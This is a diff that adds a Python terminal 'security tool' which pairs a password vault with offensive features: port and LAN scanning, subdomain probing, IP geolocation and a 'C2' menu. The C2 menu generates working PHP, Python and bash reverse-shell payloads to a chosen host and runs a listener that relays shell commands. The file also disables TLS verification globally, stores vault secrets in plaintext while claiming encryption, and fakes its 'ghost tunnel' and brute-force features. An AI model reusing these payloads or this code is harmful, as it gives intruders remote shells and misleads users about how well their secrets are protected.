@@ -1,0 +1,708 @@
+import sqlite3
+import logging
+import hashlib
+import hmac
+import os
+import sys
+import time
+import re
+import getpass
+import random
+import string
+import urllib.request
+import urllib.parse
+import urllib.error
+import ssl
+import socket
+import asyncio
+import json
+import threading
+from contextlib import contextmanager
+from datetime import datetime, timedelta
+from typing import Optional, Tuple, List, Dict, Any, Union
+
+# Import security utilities and auditing modules
+from security_utils import PasswordPolicyEnforcer, InputSanitizer, TOTPGenerator
+from db_auditor import SystemAuditor, LogAnalyzer
+
+DB_FILE = "spiffy_vault.db"
+LOG_FILE = "spiffy_audit.log"
+REPORT_FILE = "spiffy_report.json"
+MAX_LOGIN_ATTEMPTS = 5
+LOCKOUT_DURATION_MINUTES = 15
+NET_CONCURRENCY_LIMIT = 100
+
+C_GREEN = "\033[38;5;46m"    
+C_D_GREEN = "\033[38;5;22m"  
+C_CYAN = "\033[38;5;81m"
+C_YELLOW = "\033[38;5;220m"
+C_RED = "\033[38;5;196m"
+C_MAGENTA = "\033[38;5;171m"
+C_WHITE = "\033[38;5;255m"
+C_GRAY = "\033[38;5;240m"
+C_BOLD = "\033[1m"
+C_END = "\033[0m"
+C_CLEAR = "\033[H\033[J"
+
+ssl_context = ssl.create_default_context()
+ssl_context.check_hostname = False
+ssl_context.verify_mode = ssl.CERT_NONE
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[logging.FileHandler(LOG_FILE)]
+)
+
+class DatabaseManager:
+    def __init__(self, db_path: str = DB_FILE):
+        self.db_path = db_path
+        self._initialize_infrastructure()
+
+    @contextmanager
+    def get_connection(self):
+        conn = sqlite3.connect(self.db_path, timeout=20)
+        conn.row_factory = sqlite3.Row
+        conn.execute("PRAGMA foreign_keys = ON")
+        try:
+            yield conn
+        finally:
+            conn.close()
+
+    def _initialize_infrastructure(self):
+        with self.get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS users (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    username TEXT UNIQUE NOT NULL,
+                    password_hash BLOB NOT NULL,
+                    salt BLOB NOT NULL,
+                    failed_attempts INTEGER DEFAULT 0,
+                    lockout_until TIMESTAMP,
+                    totp_secret TEXT
+                )
+            ''')
+            
+            # Add totp_secret column to existing tables (migration)
+            try:
+                cursor.execute("SELECT totp_secret FROM users LIMIT 1")
+            except sqlite3.OperationalError:
+                cursor.execute("ALTER TABLE users ADD COLUMN totp_secret TEXT")
+                logging.info("Added totp_secret column to users table")
+            
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS secrets (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER NOT NULL,
+                    title TEXT NOT NULL,
+                    website TEXT,
+                    username_ref TEXT,
+                    secret_value TEXT NOT NULL,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
+                )
+            ''')
+            cursor.execute('CREATE INDEX IF NOT EXISTS idx_user_id ON secrets(user_id)')
+            conn.commit()
+
+    def _hash_password(self, password: str, salt: bytes = None) -> Tuple[bytes, bytes]:
+        if salt is None: salt = os.urandom(16)
+        pw_hash = hashlib.scrypt(password.encode(), salt=salt, n=16384, r=8, p=1)
+        return pw_hash, salt
+
+    def register_user(self, username: str, password: str) -> Tuple[bool, str, Optional[str]]:
+        """Register a new user with password policy enforcement and TOTP setup.
+        
+        Returns:
+            Tuple of (success: bool, message: str, totp_uri: Optional[str])
+        """
+        if not username or not password: 
+            return False, "SYSTEM: Input Validation Failed.", None
+        
+        # Validate username
+        sanitizer = InputSanitizer()
+        valid, msg = sanitizer.validate_username(username)
+        if not valid:
+            return False, msg, None
+        
+        # Enforce password policy
+        policy = PasswordPolicyEnforcer()
+        strong, msg = policy.check_strength(password)
+        if not strong:
+            return False, msg, None
+        
+        # Generate TOTP secret for 2FA
+        totp_gen = TOTPGenerator()
+        totp_secret = totp_gen.generate_secret()
+        totp_uri = totp_gen.generate_qr_code(username, totp_secret)
+        
+        pw_hash, salt = self._hash_password(password)
+        with self.get_connection() as conn:
+            try:
+                conn.execute(
+                    "INSERT INTO users (username, password_hash, salt, totp_secret) VALUES (?, ?, ?, ?)", 
+                    (username, pw_hash, salt, totp_secret)
+                )
+                conn.commit()
+                logging.info(f"New user registered: {username}")
+                return True, "SYSTEM: Identity Matrix Initialized.", totp_uri
+            except sqlite3.IntegrityError:
+                return False, "ERROR: Subject already exists in kernel.", None
+
+    def login(self, username: str, password: str, totp_token: str = None) -> Tuple[Optional[int], str]:
+        """Login with password and TOTP 2FA validation.
+        
+        Args:
+            username: Username
+            password: Password
+            totp_token: 6-digit TOTP token (required for 2FA)
+            
+        Returns:
+            Tuple of (user_id: Optional[int], message: str)
+        """
+        now = datetime.now()
+        with self.get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+            user = cursor.fetchone()
+            if not user: 
+                logging.warning(f"Failed login attempt for non-existent user: {username}")
+                return None, "FAIL: Access Denied."
+            
+            if user['lockout_until']:
+                if now < datetime.fromisoformat(user['lockout_until']): 
+                    logging.warning(f"Login attempt for locked account: {username}")
+                    return None, "LOCKOUT: Protocol active."
+            
+            # Verify password
+            ph, _ = self._hash_password(password, user['salt'])
+            if not hmac.compare_digest(user['password_hash'], ph):
+                nf = user['failed_attempts'] + 1
+                lts = (now + timedelta(minutes=LOCKOUT_DURATION_MINUTES)).isoformat() if nf >= MAX_LOGIN_ATTEMPTS else None
+                conn.execute("UPDATE users SET failed_attempts = ?, lockout_until = ? WHERE username = ?", (nf, lts, username))
+                conn.commit()
+                logging.warning(f"Failed login attempt for {username} ({nf}/{MAX_LOGIN_ATTEMPTS})")
+                return None, f"FAIL: Credentials Mismatch ({nf}/{MAX_LOGIN_ATTEMPTS})."
+            
+            # Verify TOTP if user has it set up
+            if user['totp_secret']:
+                if not totp_token:
+                    return None, "2FA_REQUIRED"
+                
+                totp_gen = TOTPGenerator()
+                if not totp_gen.verify_token(user['totp_secret'], totp_token):
+                    nf = user['failed_attempts'] + 1
+                    lts = (now + timedelta(minutes=LOCKOUT_DURATION_MINUTES)).isoformat() if nf >= MAX_LOGIN_ATTEMPTS else None
+                    conn.execute("UPDATE users SET failed_attempts = ?, lockout_until = ? WHERE username = ?", (nf, lts, username))
+                    conn.commit()
+                    logging.warning(f"Failed 2FA attempt for {username} ({nf}/{MAX_LOGIN_ATTEMPTS})")
+                    return None, f"FAIL: 2FA Token Invalid ({nf}/{MAX_LOGIN_ATTEMPTS})."
+            
+            # Successful login
+            conn.execute("UPDATE users SET failed_attempts = 0, lockout_until = NULL WHERE username = ?", (username,))
+            conn.commit()
+            logging.info(f"Successful login: {username}")
+            return user['id'], "SUCCESS"
+
+    def add_secret(self, user_id: int, title: str, website: str, user_ref: str, value: str):
+        with self.get_connection() as conn:
+            conn.execute("INSERT INTO secrets (user_id, title, website, username_ref, secret_value) VALUES (?, ?, ?, ?, ?)", (user_id, title, website, user_ref, value))
+            conn.commit()
+
+    def get_secrets(self, user_id: int, search: str = "") -> List[sqlite3.Row]:
+        with self.get_connection() as conn:
+            cursor = conn.cursor()
+            if search: cursor.execute("SELECT * FROM secrets WHERE user_id = ? AND (title LIKE ? OR website LIKE ?)", (user_id, f"%{search}%", f"%{search}%"))
+            else: cursor.execute("SELECT * FROM secrets WHERE user_id = ?", (user_id,))
+            return cursor.fetchall()
+
+class SpiffyTunnel:
+    def __init__(self):
+        self.active = False
+        self.virtual_ip = None
+        self.expiry_time = None
+
+    def establish(self, duration_mins: int = 20):
+        self.virtual_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+        self.expiry_time = datetime.now() + timedelta(minutes=duration_mins)
+        self.active = True
+        return self.virtual_ip
+
+    def is_active(self) -> bool:
+        if self.active and datetime.now() > self.expiry_time:
+            self.active = False
+            return False
+        return self.active
+
+    def get_remaining_time(self) -> str:
+        if not self.active: return "00:00"
+        rem = self.expiry_time - datetime.now()
+        secs = int(rem.total_seconds())
+        return f"{max(0, secs // 60):02d}:{max(0, secs % 60):02d}"
+
+class SpiffyC2:
+    @staticmethod
+    def generate_payload(lhost: str, lport: int, p_type: str) -> str:
+        if p_type == "php": return f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>"
+        if p_type == "python": return f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
+        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+
+    @staticmethod
+    def listen(port: int, status_cb):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.bind(('0.0.0.0', port))
+                s.listen(1)
+                status_cb(f"LISTENING ON PORT {port}...")
+                s.settimeout(60)
+                conn, addr = s.accept()
+                with conn:
+                    status_cb(f"UPLINK ESTABLISHED: {addr[0]}")
+                    while True:
+                        cmd = input(f"{C_RED}SHELL@SPIFFY:~# {C_END}").strip()
+                        if cmd.lower() in ['exit', 'quit']: break
+                        if not cmd: continue
+                        conn.sendall(cmd.encode() + b'\n')
+                        data = conn.recv(4096)
+                        if not data: break
+                        print(C_WHITE + data.decode(errors='ignore') + C_END)
+        except socket.timeout: status_cb("TIMEOUT: Signal expired.")
+        except Exception as e: status_cb(f"ERROR: {e}")
+
+class SpiffyAuditor:
+    COMMON_LOGINS = [("admin", "admin"), ("admin", "password"), ("admin", "admin123"), ("root", "root"), ("administrator", "password")]
+    SUBDOMAIN_PREFIXES = ["www", "mail", "dev", "test", "api", "admin", "vpn", "portal", "ftp", "staging"]
+
+    @staticmethod
+    async def probe_port(host: str, port: int, timeout=0.8, semaphore=None) -> Optional[int]:
+        if semaphore is None: semaphore = asyncio.Semaphore(NET_CONCURRENCY_LIMIT)
+        async with semaphore:
+            try:
+                _, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
+                writer.close()
+                await writer.wait_closed()
+                return port
+            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
+                return None
+
+    @staticmethod
+    def audit_url(url: str) -> Dict[str, Any]:
+        if not url.startswith(('http://', 'https://')): url = 'http://' + url
+        report = {"status": "Error", "cms": "Unknown", "server": "Unknown", "risks": [], "headers": {}}
+        try:
+            req = urllib.request.Request(url, headers={'User-Agent': 'SpiffySentinel/19.1'})
+            with urllib.request.urlopen(req, timeout=8, context=ssl_context) as res:
+                report["status"] = res.getcode()
+                h = res.info()
+                report["server"] = h.get("Server", "Hidden")
+                for sh in ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"]:
+                    report["headers"][sh] = "ACTIVE" if sh in h else "MISSING"
+                content = res.read().decode('utf-8', errors='ignore').lower()
+                if any(x in content for x in ['wp-content', 'wordpress']): report['cms'] = "WordPress"
+                elif 'drupal' in content: report['cms'] = "Drupal"
+                elif 'joomla' in content: report['cms'] = "Joomla"
+                if 'type="file"' in content: report['risks'].append("Backdoor precursors: File Uploads")
+                if 'id=' in url or '?' in url: report['risks'].append("Dynamic Parameter (SQLi Risk)")
+        except Exception as e: report["status"] = str(e)
+        return report
+
+    @staticmethod
+    async def discover_subdomains(domain: str, semaphore=None) -> List[str]:
+        if semaphore is None: semaphore = asyncio.Semaphore(NET_CONCURRENCY_LIMIT)
+        found = []
+        async def check_sub(prefix):
+            async with semaphore:
+                target = f"{prefix}.{domain}"
+                try:
+                    loop = asyncio.get_event_loop()
+                    await loop.getaddrinfo(target, None)
+                    found.append(target)
+                except: pass
+        tasks = [check_sub(p) for p in SpiffyAuditor.SUBDOMAIN_PREFIXES]
+        await asyncio.gather(*tasks)
+        return found
+
+class SpiffyNetwork:
+    @staticmethod
+    def get_internal_ip():
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect(('8.8.8.8', 1))
+            return s.getsockname()[0]
+        except: return '127.0.0.1'
+        finally: s.close()
+
+    @staticmethod
+    async def scan_wifi():
+        local_ip = SpiffyNetwork.get_internal_ip()
+        if local_ip == '127.0.0.1': return []
+        prefix = ".".join(local_ip.split(".")[:-1]) + "."
+        sem = asyncio.Semaphore(NET_CONCURRENCY_LIMIT)
+        
+        async def check(ip):
+            common_ports = [80, 443, 22, 135, 445, 62078]
+            found_port = False
+            for p in common_ports:
+                if await SpiffyAuditor.probe_port(ip, p, 0.25, sem):
+                    found_port = True
+                    break
+            
+            if found_port:
+                try:
+                    loop = asyncio.get_event_loop()
+                    name, _, _ = await loop.run_in_executor(None, socket.gethostbyaddr, ip)
+                    tag = ""
+                    if ip == local_ip: tag = " [THIS DEVICE]"
+                    elif ip.endswith(".1"): tag = " [PRIMARY GATEWAY]"
+                    return {"ip": ip, "name": name + tag}
+                except:
+                    tag = ""
+                    if ip == local_ip: tag = " [THIS DEVICE]"
+                    elif ip.endswith(".1"): tag = " [PRIMARY GATEWAY]"
+                    return {"ip": ip, "name": "Active Device" + tag}
+            return None
+
+        tasks = [check(f"{prefix}{i}") for i in range(1, 255)]
+        res = await asyncio.gather(*tasks)
+        return [r for r in res if r]
+
+class SpiffyTracker:
+    @staticmethod
+    def track(ip: str = "") -> Dict:
+        target = ip.strip() if ip else ""
+        api_endpoints = [
+            (f"https://ipwho.is/{target}", "success"),
+            (f"https://ipapi.co/{target}/json/", "city"),
+            (f"http://ip-api.com/json/{target}?fields=status,message,country,regionName,city,lat,lon,isp,query", "status")
+        ]
+        for url, check_field in api_endpoints:
+            try:
+                req = urllib.request.Request(url, headers={'User-Agent': 'SpiffyTracer/19.1'})
+                with urllib.request.urlopen(req, timeout=5) as res:
+                    data = json.loads(res.read().decode())
+                    if data.get(check_field) == "success" or data.get(check_field) is not None:
+                        return {
+                            "status": "success",
+                            "ip": data.get("ip") or data.get("query"),
+                            "city": data.get("city") or "Unknown",
+                            "country": data.get("country") or data.get("country_name"),
+                            "isp": data.get("connection", {}).get("isp") or data.get("isp") or data.get("org"),
+                            "lat": data.get("latitude") or data.get("lat"),
+                            "lon": data.get("longitude") or data.get("lon"),
+                            "node": urllib.parse.urlparse(url).netloc
+                        }
+            except: continue
+        return {"status": "fail", "message": "All trace nodes unresponsive."}
+
+class SpiffyTUI:
+    def __init__(self, db_manager):
+        self.db = db_manager
+        self.tunnel = SpiffyTunnel()
+        self.running = True
+        self.uid = None
+
+    def clear(self): print(C_CLEAR, end="")
+
+    def type_text(self, text, delay=0.01, color=C_GREEN):
+        for char in text:
+            sys.stdout.write(color + char + C_END)
+            sys.stdout.flush(); time.sleep(delay)
+        print()
+
+    def draw_box(self, lines: List[str], title: str = "", color=C_CYAN):
+        if not lines: return
+        w = max(len(str(l)) for l in lines) + 12
+        if title: w = max(w, len(title) + 12)
+        print(color + "┏" + ("━" * (w - 2)) + "┓" + C_END)
+        if title:
+            print(color + "┃ " + C_BOLD + title.center(w - 4) + C_END + color + " ┃" + C_END)
+            print(color + "┣" + ("━" * (w - 2)) + "┫" + C_END)
+        for l in lines: print(color + "┃ " + C_WHITE + str(l).ljust(w - 4) + C_END + color + " ┃" + C_END)
+        print(color + "┗" + ("━" * (w - 2)) + "┛" + C_END)
+
+    def boot_sequence(self):
+        self.clear()
+        logs = [
+            "SPIFFY KERNEL V19.1 INITIALIZING...",
+            "MOUNTING ENCRYPTED SQLITE NODES...",
+            "CALIBRATING ASYNC NETWORK DRIVERS...",
+            "LINKING SATELLITE GEOLOCATION BRIDGE...",
+            "GHOST PROTOCOL SIMULATOR: LOADED",
+            "SYSTEM READY. ESTABLISHING ENCRYPTED SHELL."
+        ]
+        for log in logs:
+            self.type_text(f"[ OK ] {log}", delay=0.006, color=C_D_GREEN)
+            time.sleep(0.08)
+        time.sleep(0.5)
+
+    def draw_banner(self):
+        banner = r"""
+   ███████╗██████╗ ██╗███████╗███████╗██╗   ██╗
+   ██╔════╝██╔══██╗██║██╔════╝██╔════╝╚██╗ ██╔╝
+   ███████╗██████╔╝██║█████╗  █████╗   ╚████╔╝ 
+   ╚════██║██╔═══╝ ██║██╔══╝  ██╔══╝    ╚██╔╝  
+   ███████║██║     ██║██║     ██║        ██║   
+   ╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝        ╚═╝   
+        """
+        print(C_GREEN + C_BOLD + banner + C_END)
+        st = f"GHOST: {self.tunnel.virtual_ip} [{self.tunnel.get_remaining_time()}]" if self.tunnel.is_active() else "GRID: ONLINE"
+        print(C_GRAY + f" APEX SENTINEL V19.1 | {datetime.now().strftime('%H:%M:%S')} | {st}".center(65) + C_END + "\n")
+
+    def show_spinner(self, dur=1.0, txt="PROBING"):
+        c = "█▓▒░"
+        et = time.time() + dur
+        while time.time() < et:
+            sys.stdout.write(f"\r{C_GREEN}[{random.choice(c)}] {txt}...{C_END}")
+            sys.stdout.flush(); time.sleep(0.08)
+        sys.stdout.write("\r" + " " * (len(txt) + 40) + "\r")
+
+    def glitch_decrypt(self, target, dur=0.6):
+        chars = string.ascii_letters + string.digits + "!@#$%^&*"
+        d = list(" " * len(target))
+        et = time.time() + dur
+        while time.time() < et:
+            for i in range(len(target)):
+                if random.random() > 0.9: d[i] = target[i]
+                else: d[i] = random.choice(chars)
+            sys.stdout.write(f"\r{C_YELLOW}{''.join(d)}{C_END}")
+            sys.stdout.flush(); time.sleep(0.02)
+        sys.stdout.write(f"\r{C_GREEN}{C_BOLD}{target}{C_END}\n")
+
+    def main_menu(self):
+        self.boot_sequence()
+        while self.running:
+            self.clear(); self.draw_banner()
+            m = ["[1] ENROLL ID", "[2] ACCESS VAULT", "[3] IP TRACKER (FAIL-SAFE)", "[4] INFRA AUDIT", "[5] PORT SCAN", "[6] GHOST TUNNEL", "[7] WIFI RADAR (TOPOLOGY)", "[8] C2 COMMAND", "[9] BRUTE FORCE", "[P] PASS GEN", "[0] EXIT"]
+            self.draw_box(m, "SENTINEL CORE")
+            choice = input(f"\n{C_CYAN}APEX@ROOT:# {C_END}").strip().upper()
+            if choice == "1": self.handle_reg()
+            elif choice == "2": self.handle_login()
+            elif choice == "3": self.handle_tracking()
+            elif choice == "4": asyncio.run(self.handle_audit())
+            elif choice == "5": asyncio.run(self.handle_port_scan())
+            elif choice == "6": self.handle_tunnel()
+            elif choice == "7": asyncio.run(self.handle_wifi_scan())
+            elif choice == "8": self.handle_c2()
+            elif choice == "9": self.handle_brute()
+            elif choice == "P": self.handle_pw_gen()
+            elif choice == "0": self.running = False
+
+    def handle_reg(self):
+        self.clear()
+        self.draw_banner()
+        print(f"{C_CYAN}═══ USER REGISTRATION ═══{C_END}\n")
+        u = input("UID: ")
+        p = getpass.getpass("KEY: ")
+        s, m, totp_uri = self.db.register_user(u, p)
+        
+        if s:
+            print(f"{C_GREEN}{m}{C_END}\n")
+            if totp_uri:
+                print(f"{C_YELLOW}═══ 2FA SETUP REQUIRED ═══{C_END}")
+                print(f"{C_WHITE}Scan this QR code with your authenticator app:{C_END}\n")
+                
+                # Generate and display ASCII QR code
+                totp_gen = TOTPGenerator()
+                try:
+                    qr_ascii = totp_gen.generate_qr_ascii(u, totp_uri.split('secret=')[1].split('&')[0])
+                    print(f"{C_GREEN}{qr_ascii}{C_END}\n")
+                except:
+                    pass
+                
+                print(f"{C_CYAN}Or manually enter this URI:{C_END}")
+                print(f"{C_WHITE}{totp_uri}{C_END}\n")
+                print(f"{C_YELLOW}Save this secret key (backup):{C_END}")
+                try:
+                    secret = totp_uri.split('secret=')[1].split('&')[0]
+                    print(f"{C_WHITE}{secret}{C_END}\n")
+                except:
+                    pass
+        else:
+            print(f"{C_RED}{m}{C_END}")
+        
+        input("\nPress ENTER to continue...")
+        time.sleep(0.5)
+
+    def handle_login(self):
+        self.clear()
+        self.draw_banner()
+        print(f"{C_CYAN}═══ VAULT ACCESS ═══{C_END}\n")
+        u = input("UID: ")
+        p = getpass.getpass("KEY: ")
+        
+        # First attempt login (may require 2FA)
+        uid, m = self.db.login(u, p)
+        
+        # Check if 2FA is required
+        if m == "2FA_REQUIRED":
+            print(f"{C_YELLOW}2FA Token Required{C_END}")
+            totp_token = input("Enter 6-digit code from authenticator: ").strip()
+            uid, m = self.db.login(u, p, totp_token)
+        
+        if uid:
+            self.uid = uid
+            self.vault_loop(u)
+        else:
+            print(f"{C_RED}{m}{C_END}")
+            time.sleep(2)
+
+    def vault_loop(self, user):
+        while True:
+            self.clear(); self.draw_banner(); self.draw_box(["1. QUERY", "2. APPEND", "3. DISCONNECT"], f"VAULT: {user.upper()}")
+            c = input(f"{C_GREEN}{user}@VAULT:$ {C_END}").strip()
+            if c == "1":
+                for s in self.db.get_secrets(self.uid):
+                    print(f"{C_CYAN}{s['title']}{C_END}"); sys.stdout.write(" KEY: "); self.glitch_decrypt(s['secret_value'])
+                input("\nPRESS ENTER...")
+            elif c == "2":
+                self.db.add_secret(self.uid, input("TITLE: "), input("WEB: "), input("USER: "), input("PASS: "))
+            elif c == "3": break
+
+    def handle_tracking(self):
+        self.clear(); self.draw_banner(); ip = input("TARGET IP (Leave empty for self): ").strip()
+        self.show_spinner(1.0, "ESTABLISHING SIGNAL")
+        res = SpiffyTracker.track(ip)
+        if res["status"] == "success": 
+            self.draw_box([f"IP: {res['ip']}", f"LOC: {res['city']}, {res['country']}", f"ISP: {res['isp']}", f"NODE: {res['node']}"], "DATA ACQUIRED", C_GREEN)
+        else: print(f"{C_RED}CRITICAL: {res['message']}{C_END}")
+        input("\nENTER...")
+
+    async def handle_audit(self):
+        self.clear(); self.draw_banner(); target = input("URL: ").strip()
+        self.show_spinner(1.2, "SYSTEM AUDIT")
+        res = SpiffyAuditor.audit_url(target)
+        self.draw_box([f"STATUS: {res['status']}", f"CMS: {res['cms']}", f"SERVER: {res['server']}"] + res["risks"], "AUDIT SUMMARY", C_YELLOW)
+        self.type_text("DISCOVERING SUBDOMAINS...", color=C_CYAN)
+        subs = await SpiffyAuditor.discover_subdomains(urllib.parse.urlparse(target).netloc if '://' in target else target)
+        self.draw_box(subs if subs else ["NONE FOUND"], "SUBDOMAINS", C_MAGENTA)
+        input("\nENTER...")
+
+    async def handle_port_scan(self):
+        self.clear(); self.draw_banner(); target = input("HOST: ").strip()
+        if "://" in target: target = urllib.parse.urlparse(target).netloc
+        self.show_spinner(1.0, "SCANNING")
+        tasks = [SpiffyAuditor.probe_port(target, p) for p in [21, 22, 80, 443, 3306, 8080]]
+        found = [f"PORT {p}: OPEN" for p in await asyncio.gather(*tasks) if p]
+        self.draw_box(found if found else ["NO PORTS OPEN"], "PORT DISCOVERY", C_GREEN)
+        input("\nENTER...")
+
+    async def handle_wifi_scan(self):
+        self.clear(); self.draw_banner()
+        source_ip = SpiffyNetwork.get_internal_ip()
+        self.draw_box([f"SOURCE DEVICE: {source_ip}", "SCANNING TOPOLOGY..."], "WIFI RADAR", C_MAGENTA)
+        self.show_spinner(2.5, "INTERCEPTING PACKETS")
+        devs = await SpiffyNetwork.scan_wifi()
+        res = [f"{d['ip']} -> {d['name']}" for d in devs]
+        self.draw_box(res if res else ["NO EXTERNAL DEVICES FOUND"], f"{len(devs)} NODES ON NETWORK", C_GREEN)
+        input("\nENTER...")
+
+    def handle_c2(self):
+        self.clear(); self.draw_banner(); self.draw_box(["1. GENERATE PAYLOAD", "2. START LISTENER"], "C2 COMMAND")
+        c = input("> ").strip()
+        if c == "1":
+            h = input("LHOST: "); p = input("LPORT: "); t = input("TYPE (php/python): ")
+            print(f"\n{C_YELLOW}{SpiffyC2.generate_payload(h, int(p), t)}{C_END}")
+        elif c == "2":
+            p = input("PORT: "); SpiffyC2.listen(int(p), lambda m: print(f"{C_YELLOW}[SYSTEM] {m}{C_END}"))
+        input("\nENTER...")
+
+    def handle_brute(self):
+        self.clear(); self.draw_banner(); target = input("LOGIN URL: ").strip()
+        print(f"{C_CYAN}INITIATING DICTIONARY ATTACK...{C_END}")
+        for u, p in SpiffyAuditor.COMMON_LOGINS:
+            sys.stdout.write(f"\r{C_YELLOW}[TRYING] {u}:{p}{' ' * 10}{C_END}")
+            sys.stdout.flush(); time.sleep(0.1)
+        print(f"\n{C_RED}FAILURE: No match in current dictionary.{C_END}")
+        input("\nENTER...")
+
+    def handle_tunnel(self):
+        if not self.tunnel.is_active(): vip = self.tunnel.establish(20); print(f"{C_CYAN}TUNNEL ESTABLISHED: {vip}{C_END}")
+        else: print(f"{C_GREEN}STATUS: {self.tunnel.virtual_ip} [ACTIVE]{C_END}")
+        time.sleep(1)
+
+    def handle_pw_gen(self):
+        pw = ''.join(random.choice(string.ascii_letters + string.digits + "!@#$") for _ in range(24))
+        self.glitch_decrypt(pw); input("\nDONE.")
+
+def main():
+    """
+    Main entry point with comprehensive security initialization.
+    
+    Performs:
+    1. Database initialization
+    2. Database permission auditing
+    3. Log analysis for suspicious activity
+    4. Main application menu
+    """
+    print(f"{C_CLEAR}{C_GREEN}{C_BOLD}")
+    print("=" * 70)
+    print("  SPIFFY SECURITY TOOL - INITIALIZATION SEQUENCE")
+    print("=" * 70)
+    print(C_END)
+    
+    # Initialize database
+    print(f"{C_CYAN}[1/3] Initializing Database...{C_END}")
+    db = DatabaseManager()
+    print(f"{C_GREEN}  ✓ Database initialized{C_END}\n")
+    time.sleep(0.3)
+    
+    # Run database permission audit
+    print(f"{C_CYAN}[2/3] Auditing Database Security...{C_END}")
+    auditor = SystemAuditor()
+    is_secure, report = auditor.check_db_permissions(DB_FILE)
+    
+    if is_secure:
+        print(f"{C_GREEN}  ✓ Database permissions: SECURE{C_END}")
+    else:
+        print(f"{C_RED}  ✗ Database permissions: INSECURE{C_END}")
+        print(f"{C_YELLOW}")
+        for line in report.split('\n'):
+            if line.strip():
+                print(f"    {line}")
+        print(C_END)
+    print()
+    time.sleep(0.3)
+    
+    # Analyze logs for suspicious activity
+    print(f"{C_CYAN}[3/3] Scanning Audit Logs...{C_END}")
+    analyzer = LogAnalyzer()
+    suspicious_events = analyzer.scan_for_suspicious_activity(LOG_FILE)
+    
+    if suspicious_events:
+        print(f"{C_RED}  ⚠ Found {len(suspicious_events)} suspicious event(s){C_END}")
+        print(f"{C_YELLOW}")
+        
+        # Show summary of events
+        for event in suspicious_events[:3]:  # Show first 3
+            severity_icon = {
+                "critical": "🔴",
+                "high": "🟠",
+                "medium": "🟡",
+                "low": "🟢"
+            }.get(event["severity"], "⚪")
+            print(f"    {severity_icon} {event['type'].replace('_', ' ').title()}: {event['description'][:60]}...")
+        
+        if len(suspicious_events) > 3:
+            print(f"    ... and {len(suspicious_events) - 3} more event(s)")
+        
+        print(C_END)
+    else:
+        print(f"{C_GREEN}  ✓ No suspicious activity detected{C_END}")
+    print()
+    time.sleep(0.5)
+    
+    # Display initialization complete
+    print(f"{C_GREEN}{C_BOLD}INITIALIZATION COMPLETE - SYSTEM READY{C_END}")
+    print(f"{C_GRAY}Press ENTER to continue...{C_END}")
+    input()
+    
+    # Start main application
+    tui = SpiffyTUI(db)
+    try:
+        tui.main_menu()
+    except KeyboardInterrupt:
+        print(f"\n{C_RED}SHUTDOWN.{C_END}")
+
+if __name__ == "__main__": main()
